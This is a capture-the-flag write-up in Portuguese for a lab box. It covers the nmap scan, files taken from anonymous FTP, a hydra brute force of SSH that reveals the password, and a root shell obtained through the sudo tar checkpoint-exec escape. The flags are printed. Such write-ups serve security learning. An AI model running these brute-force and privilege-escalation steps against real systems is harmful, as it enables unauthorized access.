# CowboyHacker

export IP="10.10.70.85"

# 1. nmap

```
PORT      STATE  SERVICE         VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp             vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.185.104
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp    open   http            Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
990/tcp   closed ftps
40193/tcp closed unknown
40911/tcp closed unknown
41511/tcp closed unknown
42510/tcp closed caerpc
44176/tcp closed unknown
44442/tcp closed coldfusion-auth
44443/tcp closed coldfusion-auth
44501/tcp closed unknown
45100/tcp closed unknown
48080/tcp closed unknown
49152/tcp closed unknown
49153/tcp closed unknown
49154/tcp closed unknown
49155/tcp closed unknown
49156/tcp closed unknown
49157/tcp closed unknown
49158/tcp closed unknown
49159/tcp closed unknown
49160/tcp closed unknown
49161/tcp closed unknown
49163/tcp closed unknown
49165/tcp closed unknown
49167/tcp closed unknown
49175/tcp closed unknown
49176/tcp closed unknown
49400/tcp closed compaqdiag
49999/tcp closed unknown
50000/tcp closed ibm-db2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

# 2. exploit

Identificado dentro do ftp dois arquivos: (task.txt) e (locks.txt), o primeiro arquivo possui o nome de usuário 'lin' e o segundo parece ser senhas.

Efetuado o brute force no SSH e identificado a senha de usuário do "lin":

```
sudo hydra -l lin -P locks.txt ssh://10.10.70.85
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-30 16:08:44
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.70.85:22/
[22][ssh] host: 10.10.70.85   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-30 16:08:56
```

Efetuado o SSH no servidor e capturado a flag de usuário.

```
sudo ssh lin@10.10.70.85
The authenticity of host '10.10.70.85 (10.10.70.85)' can't be established.
ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.70.85' (ECDSA) to the list of known hosts.
lin@10.10.70.85's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```

# 4. Privilege Escalation

Identificado que o binário tar, tem permissão para executar como root, será feito a escalação de privilégios por ele.

https://gtfobins.github.io/gtfobins/tar/

```
sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# cat /root/root.txt
THM{80UN7Y_h4cK3r}
# 
```
Capturado a flag de root e finalizado o desafio.



